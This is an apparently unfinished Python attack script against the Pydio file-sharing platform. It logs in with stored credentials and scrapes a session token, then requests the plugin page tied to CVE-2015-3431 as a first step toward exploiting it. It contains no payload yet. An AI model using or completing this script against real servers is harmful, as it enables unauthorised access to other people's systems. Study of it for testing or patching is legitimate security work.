"""
This script performs automated authentication for the pydio platform
with credentials stored in `creds.py`. It will then, hopefully, assist
in performing exploitation of CVE-2015-3431. However, the connection
at the time remains enigmatic.
"""

from creds import *
import re
import urllib
import requests

url = "http://192.168.56.101/pydio"
vuln_page = "/plugins/meta.mount/class.FilesystemMounter.php"

def parse_token(response_text):
	secure_token = response_text.split("\"SECURE_TOKEN\":")[1][:34].replace("\"","")
	if len(secure_token) == 0:
		print("[!] could not grab secure token")
		exit(0)
	return secure_token

def get_secure_token(live_session):
	print("[*] grabbing secure token")
	headers = {
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Encoding": "gzip, deflate, br",
		"Accept-Language": "en-US,en;q=0.5",
		"Connection": "keep-alive",
		"DNT": "1",
		#"Host": "distrib.dfci.harvard.edu",
		"Upgrade-Insecure-Requests": "1",
		"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:58.0) Gecko/20100101 Firefox/58.0"
	}
	r = live_session.get(
		url,
		headers=headers
	)
	if r.status_code == 200:
		parsed_token = parse_token(r.text)
		print(f"[+] parsed token: {parsed_token}")
		return parsed_token
	else:
		print(f"[!] error accessing login page ({r.status_code})...exiting")
		exit(0)


def login(live_session, login_token):
	""" 
	logs in and returns a session that is successfully auth'd
	"""
	print("[*] trying to authenticate with provided creds")
	print(f"\tusername: ({login_user})\n\tpassword: ({login_pass})")
	first_request_url = f"{url}/index.php"
	print("[*] making initial GET request")
	first_params = {
		"dir": "/",
		"get_action": "ls",
		"options": "al",
		"secure_token": login_token
	}
	first_request = live_session.get(
		url,
		params=first_params
	)
	if first_request.status_code != 200:
		print(f"[!] error ({first_request.status_code})...exiting")
		exit(0)

	#print(first_request.text)
	print("[*] making login POST request")
	login_url = f"{url}/index.php?secure_token={login_token}"
	second_params = {
		"_method": "put",
		"get_action": "login",
		"login_seed": -1,
		"password": login_pass,
		"remember_me": "false",
		"userid": login_user
	}
	second_request = live_session.post(
		login_url,
		params=second_params
	)
	if second_request.status_code != 200:
		print(f"[!] error logging in ({second_request.status_code})...exiting")
		exit(0)
	else:
		print("[+] session auth'd successfully")
		#print(second_request.text)

def access_page(live_session):
	full_vuln_url = f"{url}{vuln_page}"
	print(f"[*] attempting to touch ({full_vuln_url})")
	g = live_session.get(
		full_vuln_url
	)
	if g.status_code != 200:
		print(f"[!] failure ({g.status_code})")
	else:
		print(f"[+] response:\n\t{g.text}")

def main():
	live_session = requests.Session()
	login_token = get_secure_token(live_session)
	login(live_session, login_token)
	access_page(live_session)

if __name__ == "__main__":
	main()
